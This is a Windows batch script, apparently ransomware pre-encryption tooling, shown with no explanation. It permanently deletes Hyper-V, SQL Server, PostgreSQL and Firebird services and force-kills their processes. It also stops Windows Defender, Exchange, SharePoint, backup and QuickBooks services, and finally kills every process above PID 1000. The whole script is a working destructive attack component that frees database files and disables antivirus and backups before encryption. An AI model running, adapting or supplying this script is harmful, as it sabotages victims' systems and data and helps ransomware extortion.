@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"
sc delete "hvdsvc"
sc delete "nvspwmi"
sc delete "wmms"

taskkill -f -im vmwp.exe
taskkill -f -im vmms.exe
taskkill -f -im vmcompute.exe

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"

rem Delite Service "Fire_Bird"
sc delete "FirebirdGuardianDefaultInstance"
sc delete "FirebirdServerDefaultInstance"

rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe

net stop MSSQLServerADHelper100
net stop MSSQL$ISARS
net stop MSSQL$MSFW
net stop SQLAgent$ISARS
net stop SQLAgent$MSFW
net stop SQLBrowser
net stop ReportServer$ISARS
net stop SQLWriter
net stop WinDefend
net stop mr2kserv
net stop MSExchangeADTopology
net stop MSExchangeFBA
net stop MSExchangeIS
net stop MSExchangeSA
net stop ShadowProtectSvc
net stop SPAdminV4
net stop SPTimerV4
net stop SPTraceV4
net stop SPUserCodeV4
net stop SPWriterV4
net stop SPSearch4
net stop MSSQLServerADHelper100
net stop IISADMIN
net stop firebirdguardiandefaultinstance
net stop ibmiasrw
net stop QBCFMonitorService
net stop QBVSS
net stop QBPOSDBServiceV12
net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
net stop IISADMIN
net stop "Simply Accounting Database Connection Manager"
net stop QuickBooksDB1
net stop QuickBooksDB2
net stop QuickBooksDB3
net stop QuickBooksDB4
net stop QuickBooksDB5

TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
